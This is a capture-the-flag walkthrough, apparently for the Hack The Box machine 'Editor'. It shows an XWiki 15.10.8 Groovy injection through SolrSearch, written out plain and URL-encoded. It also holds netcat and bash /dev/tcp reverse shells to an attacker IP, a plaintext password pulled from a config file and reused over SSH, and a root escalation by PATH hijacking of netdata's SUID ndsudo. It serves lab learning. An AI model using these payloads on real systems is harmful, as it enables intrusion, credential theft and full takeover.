initial scans show 80,8080,22
we realize we need to add editor.htb to /etc/hots, as 80 is redrected to there
But 80 seems harmless
Looking at 8080, it says it is xwiki 15.10.8, and we google for an exploit, and find a theory at offsec website, which leads to a exploit py, where they send this request encoded
`{target_url}/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}`

In offsec website, they mention
```bash
curl "http://<target>/xwiki/bin/view/Main/SolrSearchMacros?search=groovy:java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')"
```

We see the thing from POC working, not the offsec one. so we modify it to give rev shell
```
}}}{{async async=false}}{{groovy}}println("mkfifo /tmp/f; nc 10.10.14.31 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm tmp/f".execute().text){{/groovy}}{{/async}}
```
url encode it with burp, start listening, send req
But burp is acting weird so, just edit the encoded part
```
http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22cat%20%2Fetc%2Fpasswd%22.execute%28%29.text%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```
to include mkfifo
However, non of the rev shell work.
This is because of the inability of groovy of java to process pipes, and our mkfifo is full of them
The way we need to give it is something like
["bash", "-c", "cmd"] inside the println("").execute().text
So now, even if the command has a pipe, that part will be handled by bash command

Alternatively, we can drop a file into the file system using the command injection, and run the file in the next command.
We choose the first method of providing the list input, something like
println(["/bin/bash", "-c", "echo 'abc' | base64"]).execute().text
This works, so it is good, since we can write a rev shell, base64 encode it, write it in the command, and pipe it to bash
println(["/bin/bash","-c","echo \<b64\> | base64 --decode | bash])
where, our \<b64> is the base64 encoded rev shell

Preparing the base64 rev shell in kali. wherever we see a +, replace the space with 2 spaces
`echo -n 'bash -i >& /dev/tcp/10.10.14.31/4444 0>&1' | base64` , url-encode the whole thing, send the page req, www shell
While looking around in /etc/xwiki, we find a password theEd1t0rTeam99 in the hibernate.cfg.xml using the command
`grep -R "pass"`
we look for valid users, and there's only oliver
We try su oliver, but it doesnt work
Trying it on ssh works

we do `groups` and see the user is a member f netdata group
When we search for SUID files, we also see a etdata/ndsudo entry
Quick search for the exploit of ndsudo reveals it runs a file at unsecure path.
This means if we make ndsudo run a file that we create at a loc, it will run that malicious file, as long as it comes early in the $PATH

we try to run the command `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list` in the victim, and it says "nvme not found in PATH"
So we write a C code that sets uid, gid bits to 0, and calls bash, hence root
```C
#include <stdlib.h>
#include <unistd.h>
int main(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
        return 0;
}
```
`gcc privesc.c -o nvme`
`cd /dev/shm`
`export PATH=$(pwd):$PATH`
python server, `wget http://10.10.14.31:8990/nvme`
`/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`
root!